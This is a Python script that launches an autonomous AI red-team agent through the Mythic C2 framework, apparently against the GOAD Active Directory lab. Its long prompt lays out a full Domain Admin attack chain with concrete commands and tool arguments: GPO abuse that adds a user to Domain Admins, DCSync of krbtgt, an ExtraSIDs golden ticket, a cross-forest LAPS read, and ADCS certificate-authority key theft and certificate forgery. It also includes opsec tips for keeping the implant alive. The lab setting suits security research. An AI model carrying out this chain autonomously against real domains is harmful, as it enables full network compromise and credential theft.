#!/usr/bin/env python3
"""Throwaway (gitignored) — resume the autonomous solve from the live CASTELBLACK foothold toward essos DA.

Command-construction layer (slices 1/2/2b/2c) is loaded in the restarted Sage and validated live, so command
construction should be reliable across the chain. Drives the documented Trust Walker. The NORTH hop escalates
via the DC-scoped GPO (SYSTEM-on-DC adds the controlled principal to NORTH Domain Admins — a 2026-06-09
graph-confirmed primitive, NOT a doomed DS-Replication self-grant). The ESSOS hop uses the GOLDEN-TICKET /
ADCS route because adding a foreign-forest principal to DOMAIN ADMINS@ESSOS is structurally impossible (global
group cannot hold a foreign member) — that dead-end applies to the cross-forest hop ONLY. Read results from Phoenix.
"""
import asyncio
import argparse
import base64
import json
import os
import sys
import time

sys.path.insert(0, "/home/john/dev/sage/Payload_Type/sage")
from evals.harness import resolve_password, login_to_mythic  # noqa: E402
from evals import phoenix_reader  # noqa: E402
from mythic import mythic  # noqa: E402

DB = "/home/john/dev/sage/Payload_Type/sage/.phoenix/phoenix.db"
DEADLINE_S = 1500
AUTO_GOAD_MAX_STEPS = 0
GUIDED_ESSOS_ROUTE_FACTS = (
    "can-read-managed-local-admin-secret:"
    "account=cersei.lannister;account_domain=sevenkingdoms.local;target=braavos;target_domain=essos.local "
    "certificate-auth-target:administrator@essos.local"
)


def _env_int(name: str, default: int | None = None) -> int | None:
    value = os.environ.get(name)
    if value in (None, ""):
        return default
    return int(value)


def payload_type_name(callback: dict) -> str:
    payload = callback.get("payload") or {}
    payloadtype = payload.get("payloadtype") or callback.get("payloadtype") or {}
    if isinstance(payloadtype, dict):
        return str(payloadtype.get("name") or "")
    return str(payloadtype or "")


def select_run_callbacks(
    callbacks: list[dict],
    *,
    sage_cb: int | None = None,
    apollo_cb: int | None = None,
) -> tuple[int, int]:
    rows = [
        callback for callback in callbacks
        if callback.get("active") is not False and isinstance(callback.get("display_id"), int)
    ]
    if sage_cb is None:
        sage_candidates = [
            callback["display_id"] for callback in rows
            if payload_type_name(callback).casefold() == "sage"
        ]
        sage_cb = max(sage_candidates, default=None)
    if apollo_cb is None:
        apollo_candidates = [
            callback["display_id"] for callback in rows
            if payload_type_name(callback).casefold() == "apollo"
            and str(callback.get("host") or "").casefold() == "castelblack"
            and "samwell" in str(callback.get("user") or "").casefold()
        ]
        apollo_cb = max(apollo_candidates, default=None)
    missing = []
    if sage_cb is None:
        missing.append("live Sage callback")
    if apollo_cb is None:
        missing.append("live Apollo callback on CASTELBLACK as samwell")
    if missing:
        raise RuntimeError(f"could not auto-select {', '.join(missing)}")
    return int(sage_cb), int(apollo_cb)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Run the guided GOAD ESSOS DA one-shot.")
    parser.add_argument(
        "--auto-callbacks",
        action="store_true",
        help="discover the latest live Sage callback and CASTELBLACK samwell Apollo callback",
    )
    parser.add_argument("--sage-cb", type=int, default=None, help="override Sage callback display_id")
    parser.add_argument("--apollo-cb", type=int, default=None, help="override Apollo callback display_id")
    parser.add_argument("--merlin-cb", type=int, default=None, help="optional Merlin callback display_id")
    return parser


def build_state_objective() -> str:
    return f"obtain administrative control of essos.local {GUIDED_ESSOS_ROUTE_FACTS}"


def build_objective(apollo_cb: int) -> str:
    return (
    "You are running an autonomous red-team engagement against the GOAD lab. GOAL: reach and VERIFY Domain "
    "Admin on the essos.local forest.\n\n"
    "STRUCTURED GUIDED FACTS (graph-equivalent, typed facts for the generic capability planner): "
    f"{GUIDED_ESSOS_ROUTE_FACTS}\n\n"
    "FIRST, CHECK THE ATTACK GRAPH: BloodHound MAY already hold a graph from a prior run. Ask the BloodHound "
    "agent (domain_info / available-domains) whether your foothold domains (north.sevenkingdoms.local, "
    "sevenkingdoms.local) are ALREADY present; if so, SKIP collection entirely and go straight to planning hops "
    "from the existing graph. ONLY if the graph is empty or missing your domain, run ONE SharpHound collection from your "
    "CASTELBLACK foothold with your CURRENT access (`-c All --SearchForest --CollectAllProperties` so ACLs, GPOs, "
    "LAPS, and ADCS/cert templates are captured). Your current privileges bound what the collection can see — do "
    "NOT tune flags or re-collect chasing a fuller graph at the same access level. Collect once per access "
    "context, ingest, and analyze. A later collection is allowed only after your identity/privileges/ticket "
    "context changes AND the current graph lacks the data needed for the next hop. "
    "Write the ZIP to a directory you can BOTH list AND read back as samwell.tarly "
    "(`--OutputDirectory C:\\Users\\Public`) — NEVER `C:\\Windows\\Temp` (a non-admin can write there but "
    "cannot list/read it back, stranding the file). After collecting, `ls C:\\Users\\Public` to read the EXACT "
    "timestamped zip name, then `download` THAT exact path once. Ingest it into BloodHound via `ingest_collection` (in-memory: it fetches the downloaded collection "
    "bytes and uploads them straight into BloodHound, then POLLS the ingest job to completion and returns "
    "graph_verified — ingest is ASYNC ~40s, so do NOT conclude failure from an immediate empty domain_info), "
    "CONFIRM ingestion succeeded (graph_verified / domain_info lists the collected domains), and THEN QUERY "
    "the graph to plan each hop. BloodHound auto-connects on your first query (no manual mcp-connect). Collect "
    "ONCE for each distinct access context; after the graph is built for that context, do not re-collect until "
    "your access changes and you have a concrete missing-data reason.\n\n"
    "CURRENT ACCESS:\n"
    f"- Apollo callback {apollo_cb} on host CASTELBLACK as NORTH\\samwell.tarly (assumed-breach foothold).\n\n"
    "KNOWN PATH (execute hop by hop; confirm each before moving on):\n"
    "1. samwell.tarly controls the STARKWALLPAPER GPO. FIRST confirm its SCOPE from the graph — what it is "
    "linked to and which computers it covers, and whether a Domain Controller is in scope (see "
    "ttps/sharpgpoabuse.md 'Choosing the abuse primitive — the GPO's SCOPE decides'). STARKWALLPAPER is linked "
    "at the NORTH domain root, so its scope INCLUDES WINTERFELL (the NORTH DC). Prefer Sage's deterministic "
    "`execute_capability` path for `gpo-controlled-system-exec` with `command=\"cmd.exe\"` and "
    "`arguments=\"/c net group \\\"Domain Admins\\\" samwell.tarly /add /domain\"`, without forcing the "
    "PowerShell/GPP fallback method. The default capability plan should use the registered `SharpGPOAbuse.exe` "
    "`--AddComputerTask --Force` path through Apollo `execute_assembly` (fork-and-run), then perform a bounded "
    "GP-refresh wait and poll the domain-visible membership proof. Use `method=\"gpp-immediate-task-fallback\"` "
    "only if the primary SharpGPOAbuse/execute_assembly path is unavailable or fails from a recoverable "
    "construction issue, because the fallback emits a large PowerShell/.NET LDAP+SYSVOL writer. Do NOT drop a "
    "beacon/callback on WINTERFELL (it is a "
    "Defender-enabled DC; a beacon there is unreliable and unnecessary). Because the GPO's SYSTEM computer-task "
    "runs ON the DC (whose SYSTEM context IS domain-privileged), make a DURABLE privilege change there: ADD a "
    "principal you control to NORTH Domain Admins via the SYSTEM task. Use raw SharpGPOAbuse `--AddComputerTask` "
    "only if the deterministic capability builder is unavailable. Do NOT self-grant DS-Replication "
    "on the domain head: samwell (and SYSTEM on a MEMBER host) lacks WriteDACL on the NORTH domain object, so a "
    "self-grant returns Access-denied no matter how it is delivered — the SYSTEM-on-DC group-add is the working primitive. "
    "After the GPO write returns, treat it as SETUP ONLY. Do NOT DCSync before membership is confirmed. If the "
    "deterministic capability returns partial/failed after its bounded wait and membership poll, report that "
    "specific blocker instead of adding arbitrary extra sleeps. Do not request `proof_path`, `proof_only`, or "
    "`allow_proof_only` for this hop; the verifier is the domain-visible Domain Admins membership poll. "
    "Once membership appears, purge stale Kerberos tickets (`klist purge` or equivalent), "
    "trigger fresh authentication to the DC, then continue.\n"
    f"2. DCSync NORTH **remotely from your CASTELBLACK foothold** (cb{apollo_cb}) only after the membership/PAC "
    "refresh above. Recover the NORTH `krbtgt` and a privileged principal (jon.snow et al. are also LSASS-resident on CASTELBLACK — "
    "Defender is OFF there — if you prefer the local dump). Forge the child→parent ExtraSIDs golden ticket "
    f"on Apollo callback {apollo_cb} by first calling `build_capability_commands` for `forge-golden-ticket` "
    "with `domain=north.sevenkingdoms.local` and `target_domain=sevenkingdoms.local`; let the builder resolve "
    "numeric Windows SIDs from BloodHound and select the verified CHILD `krbtgt` key. If the builder cannot "
    "resolve a SID, re-query BloodHound/directory data for the numeric SID (`S-1-5-21-...`, not a GUID/objectId) "
    "and retry with provenance such as `parent_domain_sid_source=\"BloodHound domain objectid for sevenkingdoms.local\"`. "
    "For any native Apollo or Mimikatz DCSync, the target user must be NETBIOS-qualified (`NORTH\\krbtgt`, not bare "
    "`krbtgt`) to avoid CrackNames `ERROR_NOT_UNIQUE` in the multi-domain forest. Then issue the exact returned structured `mimikatz` command, and do not hand-edit the returned SID/key/domain fields. Prove sevenkingdoms.local DA "
    "before attempting parent DCSync or the forest-trust path to essos.local. Use BloodHound to pick the concrete edges.\n"
    "3. CROSS THE FOREST TRUST via a LEGITIMATE foreign-group membership (SID filtering blocks SID history / a "
    "cross-forest golden ticket, NOT real group memberships). Graph-confirmed: seize a member of "
    "`SMALL COUNCIL@SEVENKINGDOMS` (you own sevenkingdoms from the NORTH krbtgt child->parent climb; "
    "Domain/Enterprise Admins@SEVENKINGDOMS hold GenericAll on SMALL COUNCIL — e.g. lord.varys or "
    "cersei.lannister). `SMALL COUNCIL@SEVENKINGDOMS` is MemberOf `SPYS@ESSOS`, and `SPYS` has "
    "ReadLAPSPassword on `BRAAVOS.ESSOS.LOCAL` (the ESSOS-CA host) — read the BRAAVOS LAPS local-admin password.\n"
    "4. ESSOS DOMAIN ADMIN via ADCS GoldenCert: with local admin on BRAAVOS (the ESSOS-CA host), steal the "
    "ESSOS-CA private key and FORGE a certificate for an essos Domain Admin (ForgeCert, or certipy `ca` + "
    "`forge`), then authenticate with it (PassTheCert, or PKINIT via Rubeus `asktgt`) to obtain an essos DA "
    "TGT. Fallback: ADCS ESC1/ESC3 enrollment from your essos context on BRAAVOS (DOMAIN USERS@ESSOS can "
    "enroll the ESC1 template). VERIFY essos DA (e.g. DCSync the essos `krbtgt`/Administrator from "
    "meereen.essos.local, or list \\\\meereen.essos.local\\C$). State clearly when essos DA is achieved.\n\n"
    "ANTI-DEAD-END: adding your foreign-forest principal to DOMAIN ADMINS@ESSOS.LOCAL is STRUCTURALLY IMPOSSIBLE "
    "(Domain Admins is a GLOBAL group; a global group cannot contain a foreign member). Do NOT attempt it. Use "
    "the golden-ticket route above.\n\n"
    "TRADECRAFT / OPSEC (scoped): run offensive .NET assemblies via `execute_assembly` / `execute-assembly` "
    "ONLY (fork&run into a sacrificial spawnto process — crash-isolated), referencing REGISTERED files BY NAME "
    "(e.g. filename='SharpGPOAbuse.exe'/'Rubeus.exe'/'StandIn.exe'). Do NOT use `inline_assembly` or "
    "`load-assembly`+`invoke-assembly` for offensive tools (SharpGPOAbuse, Rubeus, StandIn, etc.) — they run "
    "IN-PROCESS, and when the tool finishes it calls Environment.Exit(), which KILLS the implant. Fork&run "
    "(execute_assembly) isolates that. Exception: golden-ticket / SID-history ticket forging must use "
    "`build_capability_commands` and issue the exact returned structured `mimikatz` command; do not handcraft "
    "Rubeus or edit SID/key/domain fields. BOFs are fine. NO "
    "offline credential cracking (a golden ticket uses the krbtgt hash directly — allowed). Run SharpHound ONCE "
    "per distinct access context: initial foothold first, then only after a verified privilege/identity change "
    "when the observed graph lacks the data needed for the next hop. "
    "If a tool argument is rejected, fix the argument form (correct parameter group / SID vs DN) and retry; do "
    "not abandon on a recoverable error and do not blindly repeat a genuinely-failed call. EXECUTE each step and "
    "narrate; only stop when essos DA is verified or you hit a genuinely unrecoverable, named missing capability."
    )


async def dump(client, tid):
    out = await mythic.get_all_task_output_by_id(mythic=client, task_display_id=tid)
    return "\n".join(
        base64.b64decode(o.get("response_text") or "").decode("utf-8", "replace")
        if o.get("response_text") else str(o.get("response") or "")
        for o in out
    )


async def main():
    args = build_parser().parse_args()
    client = await login_to_mythic(resolve_password())
    if args.auto_callbacks:
        callbacks = await mythic.get_all_active_callbacks(client)
        sage_cb, apollo_cb = select_run_callbacks(
            callbacks,
            sage_cb=args.sage_cb,
            apollo_cb=args.apollo_cb,
        )
    else:
        sage_cb = args.sage_cb or _env_int("SAGE_CB", 1)
        apollo_cb = args.apollo_cb or _env_int("APOLLO_CB", 2)
        if sage_cb is None or apollo_cb is None:
            raise RuntimeError("Sage and Apollo callback display IDs are required")
    merlin_cb = args.merlin_cb or _env_int("MERLIN_CB", 2)
    objective = build_objective(apollo_cb)
    state_objective = build_state_objective()
    state_task = await mythic.issue_task(
        mythic=client,
        command_name="state",
        parameters=json.dumps({"action": "objective", "hop": state_objective}),
        callback_display_id=sage_cb,
    )
    state_tid = state_task.get("display_id") or state_task.get("id")
    print(f"state objective task: {json.dumps(state_task, default=str)[:200]}")
    state_out = await mythic.waitfor_for_task_output(client, task_display_id=state_tid, timeout=60)
    if isinstance(state_out, (bytes, bytearray)):
        state_out = state_out.decode(errors="replace")
    print(f"state objective set via task {state_tid}: {str(state_out or '')[:800]}")
    pre = phoenix_reader.max_trace_rowid(DB)
    print(f"pre_rowid={pre}")
    print(f"using callbacks: sage={sage_cb} merlin={merlin_cb} apollo={apollo_cb}")
    task = await mythic.issue_task(
        mythic=client, command_name="query",
        parameters=json.dumps({
            "prompt": objective,
            "verbose": True,
            "autonomous_solve": True,
            "max_steps": AUTO_GOAD_MAX_STEPS,
            "mode": "auto",
        }),
        callback_display_id=sage_cb,
    )
    tid = task.get("display_id") or task.get("id")
    print(f"issued task: {json.dumps(task, default=str)[:200]}\nTASK_ID={tid}")
    start = time.time()
    while True:
        el = int(time.time() - start)
        q = "query t($id:Int!){ task(where:{display_id:{_eq:$id}}){ display_id status completed } }"
        rows = (await mythic.execute_custom_query(mythic=client, query=q, variables={"id": tid})).get("task", [])
        if rows:
            t = rows[0]
            print(f"[{el}s] status={t.get('status')!r} completed={t.get('completed')}")
            if t.get("completed") or (t.get("status") or "").lower() in ("error", "completed"):
                break
        else:
            print(f"[{el}s] task {tid} not found yet")
        if el > DEADLINE_S:
            print(f"[{el}s] DEADLINE hit")
            break
        await asyncio.sleep(20)
    q2 = ("query t($id:Int!){ task(where:{display_id:{_gt:$id}}, order_by:{display_id:asc}){ display_id "
          "command_name status callback{display_id host payload{payloadtype{name}}} } }")
    subs = (await mythic.execute_custom_query(mythic=client, query=q2, variables={"id": tid})).get("task", [])
    print(f"\n=== NEW SUBTASKS after {tid}: {len(subs)} ===")
    for t in subs:
        cb = t.get("callback") or {}
        pt = ((cb.get("payload") or {}).get("payloadtype") or {}).get("name")
        print(f"  #{t['display_id']} cb{cb.get('display_id')}({str(cb.get('host'))[:11]}) {pt} {t['command_name']} {t['status']}")
    print("\n=== DECODED OUTPUT (last 9000 chars) ===")
    print((await dump(client, tid))[-9000:])


if __name__ == "__main__":
    asyncio.run(main())
